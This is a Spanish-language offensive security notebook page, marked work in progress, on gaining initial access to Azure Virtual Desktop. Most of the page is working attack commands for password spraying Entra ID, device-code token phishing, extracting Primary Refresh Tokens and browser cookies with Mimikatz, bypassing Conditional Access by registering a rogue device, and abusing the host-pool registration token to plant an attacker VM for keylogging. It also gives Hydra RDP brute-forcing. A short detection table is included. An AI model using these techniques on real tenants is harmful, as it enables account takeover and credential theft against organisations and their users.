---
tags: [cloud, azure, avd, initial-access, credential-theft, conditional-access]
status: wip
---

# AVD — Acceso Inicial

> Técnicas para obtener acceso a un entorno Azure Virtual Desktop: password spray, token theft, PRT abuse, bypass de Conditional Access y abuso del registration token.

---

## Password Spray contra Entra ID

```bash
# MSOLSpray — spray contra login.microsoftonline.com
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList users.txt -Password "Summer2024!" -Verbose

# trevorspray — más sigiloso, soporta fireprox
trevorspray -u users.txt -p 'Summer2024!' --url https://login.microsoftonline.com

# Importante: respetar smart lockout de Entra ID
# - Threshold por defecto: 10 intentos
# - Cooldown: 60 segundos (incrementa)
# - Lockout es por IP + por usuario
```

> ⚠️ El password spray contra Entra ID genera logs en **Sign-in Logs** → filtrar por `Status: Failure` y `Error code: 50126`.

---

## Phishing de tokens — Device Code Flow

```bash
# TokenTactics — obtener token vía device code phishing
Import-Module .\TokenTactics.psd1

# Generar device code
Get-AzureTokenDeviceCode -Client MSGraph

# Enviar la URL (https://microsoft.com/devicelogin) + código a la víctima
# Cuando la víctima introduce el código → obtienes sus tokens

# Intercambiar refresh token por token de AVD
RefreshTo-AzureManagementToken -RefreshToken $response.refresh_token
```

---

## Token Theft — Robo de tokens existentes

### Desde el navegador (cookie de sesión)

```bash
# Las sesiones autenticadas en portal.azure.com o rdweb usan cookies
# Extraer cookies del navegador de una sesión comprometida:
# - Chrome: SharpChrome / Mimikatz dpapi::chrome
# - Firefox: firepwd.py / dumpzilla

# Cookie clave: ESTSAUTH / ESTSAUTHPERSISTENT en login.microsoftonline.com
```

### PRT (Primary Refresh Token)

```powershell
# El PRT es un token persistente en dispositivos joined/registered a Entra ID
# Equivale a un TGT: da acceso a todos los recursos Azure/M365

# Verificar si hay PRT
dsregcmd /status
# → AzureAdPrt: YES = hay PRT en la máquina

# Extraer PRT con Mimikatz (requiere SYSTEM)
mimikatz # privilege::debug
mimikatz # sekurlsa::cloudap
# → Devuelve PRT + session key (derivada del DPAPI transport key)

# Usar PRT para obtener access tokens
# roadtoken / AADInternals
Import-Module AADInternals
$prt = '<PRT_VALUE>'
$sessionKey = '<SESSION_KEY>'
$token = New-AADIntAccessTokenForAADGraph -PRTToken $prt -SessionKey $sessionKey
```

---

## Conditional Access Bypass

Las políticas de Conditional Access (CA) pueden restringir el acceso a AVD. Vectores de bypass:

### Cambiar Client App / User Agent

```bash
# Si la política aplica solo a "Browser" o "Mobile apps and desktop clients"
# Probar con User-Agent de cliente no cubierto

# Ejemplo: si la CA bloquea browser pero no el cliente AVD nativo
# Conectar desde el Windows Desktop Client (msrdcw.exe) en lugar del web client
```

### Dispositivo compliant (Intune)

```powershell
# Si la CA exige "Require device to be marked as compliant"
# Opción 1: registrar un dispositivo propio en Entra ID y cumplir compliance
# Opción 2: usar PRT de un dispositivo ya compliant

# Registrar dispositivo con AADInternals
Join-AADIntDeviceToAzureAD -DeviceName "CorpLaptop" -DeviceType "Windows" \
  -OSVersion "10.0.19045" -AccessToken $token
```

### Exclusiones de CA

```bash
# Buscar exclusiones en las políticas:
# - Cuentas de servicio excluidas
# - Rangos IP de "trusted locations" → conectar desde VPN corporativa
# - Legacy authentication protocols excluidos

# Enumerar políticas CA con Graph
az rest --method GET \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccessPolicies" \
  --headers "Authorization=Bearer $TOKEN"
```

---

## Abuso del Registration Token

```powershell
# El registration token permite registrar nuevos session hosts en un host pool
# Si se obtiene → registrar una VM controlada como session host

# Obtener token (requiere Desktop Virtualization Contributor o superior)
az desktopvirtualization hostpool retrieve-registration-token \
  --name <POOL> --resource-group <RG>

# Con el token: instalar el AVD Agent en una VM propia
# → La VM se registra en el host pool
# → Usuarios que se conecten aterrizan en tu VM
# → Captura de credenciales, keylogging, clipboard hijacking
```

> ⚠️ Este ataque genera eventos de registro de nuevos hosts en los logs del host pool.

---

## Acceso vía RDP directo (si expuesto)

```bash
# Si los session hosts tienen 3389/TCP abierto (NSG permisivo)
# Intentar RDP directo con credenciales obtenidas

# Validar con nmap
nmap -p 3389 <SESSION_HOST_IP> -Pn

# xfreerdp para Linux
xfreerdp /v:<IP> /u:user@domain.com /p:'password' /cert:ignore

# Hydra para fuerza bruta (ruido alto)
hydra -L users.txt -P passwords.txt rdp://<IP>
```

---

## OPSEC / Detección

| Acción | Log/Alerta |
|--------|------------|
| Password spray | Entra ID Sign-in Logs — múltiples `50126` desde misma IP |
| Device code phishing | Sign-in Log con `deviceCode` como authentication method |
| PRT theft | Windows Event `4624` tipo 10 + `dsregcmd` en command line logs |
| Registration token abuse | Azure Activity Log — `RetrieveRegistrationToken` operation |
| RDP directo | NSG Flow Logs + Windows Security Log `4624` tipo 10 |

---

## Ver también

- [[09-cloud/azure/azure-virtual-desktop|Azure Virtual Desktop]]
- [[09-cloud/azure/avd---enumeración|AVD - Enumeración]]
- [[09-cloud/azure/avd---session-host-attacks|AVD - Session Host Attacks]]
- [[09-cloud/azure/avd---breakout|AVD - Breakout]]

---

## Referencias

- [TokenTactics — rvrsh3ll](https://github.com/rvrsh3ll/TokenTactics)
- [AADInternals — Device Join](https://aadinternals.com/post/intune/)
- [PRT Abuse — dirkjanm](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
- [Conditional Access Bypass Techniques — Mandiant](https://cloud.google.com/blog/topics/threat-intelligence)
